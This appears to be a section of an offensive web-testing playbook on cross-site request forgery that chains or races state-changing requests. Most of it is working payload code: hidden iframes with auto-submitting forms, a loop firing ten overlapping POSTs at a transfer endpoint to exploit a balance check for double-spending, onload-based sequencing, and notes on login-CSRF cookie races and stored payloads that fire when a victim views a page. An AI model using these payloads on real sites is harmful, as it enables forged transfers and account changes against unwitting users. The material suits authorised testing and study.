# Multi-step writes and CSRF races

When the write needs two requests in sequence, or the delivery must
beat a check — the chained and timed shapes.

---

## 1. The multi-step write — chaining forms

```text
a write that needs request A then request B:
- create an object → then modify it
- a two-step transfer → initiate + confirm
- a write that needs a prior GET to seed state
```

```html
<!-- two forms, two iframes — fire both -->
<iframe name=w1 style=display:none></iframe>
<iframe name=w2 style=display:none></iframe>
<form target=w1 action="https://t/step1" method=POST><input name=a value=1></form>
<form target=w2 action="https://t/step2" method=POST><input name=b value=2></form>
<script>
  document.forms[0].submit();
  setTimeout(()=>document.forms[1].submit(),500);   // sequence
</script>
```

Each form in its own iframe — independent, non-navigating. The
`setTimeout` sequences them when B depends on A completing.

## 2. The sequential-then-check — a GET after a POST

```html
<iframe name=w1 style=display:none></iframe>
<form target=w1 action="https://t/write" method=POST><input name=a value=1></form>
<script>
  document.forms[0].submit();
  setTimeout(()=>location='https://t/confirm',800);  // then a nav
</script>
```

## 3. The CSRF race — beating a check-then-act

```text
a check-then-act window the CSRF must hit:
- a 'is this object yours?' check before a modify
- a balance-check before a transfer — a double-spend
- a uniqueness check before a create — a race to register
```

```js
// fire N overlapping writes — one may slip through the check window
for(let i=0;i<10;i++){
  var f=document.createElement('iframe');f.name='w'+i;
  document.body.appendChild(f);
  var fm=document.createElement('form');fm.target='w'+i;
  fm.action='https://t/transfer';fm.method='POST';
  fm.innerHTML='<input name=amount value=100>';document.body.appendChild(fm);
  fm.submit();
}
// 10 simultaneous POSTs — the server-side race window
```

The browser fires them in parallel — a server-side check-then-act
window may let several through. `tools/web/race_probe.py` measures
the window on a direct request; the CSRF version fires the overlap
from the page.

## 4. The cookie-race — a Set-Cookie vs a write

```text
the SSOS shape: a login-CSRF writes a Set-Cookie into the shared
jar; a SUBSEQUENT bot action reads the jar. the write must land
BEFORE the bot's next action — the timing matters.
```

## 5. The "which fires first" — the ordering problem

```text
the browser doesn't guarantee cross-form ordering — a form nav is
async. when B depends on A:
- fire A in an iframe; on the iframe's load event, fire B
- OR a fetch chain (if the endpoint is reachable): fetch A then B
```

```html
<iframe name=w1 onload="document.forms[1].submit()" style=display:none></iframe>
<iframe name=w2 style=display:none></iframe>
<form target=w1 action="https://t/step1" method=POST><input name=a value=1></form>
<form target=w2 action="https://t/step2" method=POST><input name=b value=2></form>
<script>document.forms[0].submit()</script>
<!-- the w1 onload fires after step1's response → then step2 -->
```

The iframe's `onload` is the sequencing signal — it fires when the
form's response loads.

## 6. The race-tool — measuring the window

```bash
# is there a check-then-act window? measure it on a direct request
python3 tools/web/race_probe.py --url "$BASE/transfer" --write-ack
# the serial-baseline first — a signature that also appears serially
# isn't a race
```

The CSRF version replicates the overlap from the page — but the
window itself is measured server-side.

## 7. The deferred-trigger — the write that fires later

```text
a stored CSRF payload that fires when a future page-view triggers it:
- a stored profile-field form — fires when the profile renders
- a stored comment with a form — fires on view
- a stored value a later same-origin action uses
```

The write's trigger is deferred to the victim's next view — the
CSRF is planted, then fires on a schedule.

## 8. The falsifier

```text
- the two writes can't be sequenced (no iframe-load signal, no
  ordering) → only one fires reliably
- the race window is too tight AND the browser can't generate
  enough overlap → the serial case dominates
- the shared jar doesn't persist → the Set-Cookie write doesn't
  survive to the next read
```

## 9. The ledger

```bash
python3 tools/state.py <c> --hypothesis \
  "csrf-race: overlap forms -> server check-then-act window"
```
